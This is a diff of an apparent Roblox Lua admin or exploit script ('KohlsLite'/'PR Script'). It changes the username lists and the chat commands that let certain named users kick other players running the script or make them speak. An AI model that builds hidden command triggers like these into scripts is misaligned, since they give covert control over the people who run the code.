@@ -51,7 +51,7 @@ local blacklist = {"SlenderMan990921","e5usp","Asphetto","91txt","LeanConsumer69
 local whitelist = {"me_123eq","me_crashking","ScriptingProgrammer","t_echr","BANNter_Original","witnessfox22","IceStuds","atprog","dawninja21","Dawninja21alt","Di33le2","darkmadeboy","Dekryptionite","3cxos","hudhejeir","BIGpe7niss7","clydekash","t_echl","Ih0temyIife"}
 
 -- Players you cannot kick
-local nokick = {"me_123eq","me_crashking","ScriptingProgrammer","t_echr","BANNter_Original","witnessfox22","IceStuds","atprog","dawninja21","Dawninja21alt","Di33le2","darkmadeboy","Dekryptionite","3cxos","hudhejeir","BIGpe7niss7","clydekash","t_echl","Ih0temyIife"}
+local nokick = {"me_123eq","me_crashking","ScriptingProgrammer","t_echr","BANNter_Original","witnessfox22","IceStuds","atprog","dawninja21","Dawninja21alt","Di33le2","darkmadeboy","Dekryptionite","3cxos","hudhejeir","BIGpe7niss7","clydekash","t_echl"}
 
 -- New users get blacklisted (prevent crashers)
 local newplrslocked = {} -- don't edit!!
@@ -5455,7 +5455,7 @@ v.Chatted:Connect(function(msg)
 			end
                 end
 
-                if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
+                if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
 			if not table.find(nokick,game.Players.LocalPlayer.Name) then
 	                 	Speak("[PR Script]: atprog is my daddy fr!")
 			end
@@ -5467,11 +5467,11 @@ v.Chatted:Connect(function(msg)
 
          	if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "dawninja21" or v.Name == "Dawninja21alt") then
 			if not table.find(nokick,game.Players.LocalPlayer.Name) then
-				game.Players.LocalPlayer:Kick("[KohlsLite]: dawninja {kohlslite admin} kicked you from the game!")
+				game.Players.LocalPlayer:Kick("[KohlsLite]: dawninja {kohlslite begger} kicked you from the game!")
 			end
                 end  
     
-                if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
+                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
 			if not table.find(nokick,game.Players.LocalPlayer.Name) then
 				game.Players.LocalPlayer:Kick("[PR Script]: atprog kicked you from the game!")
 			end
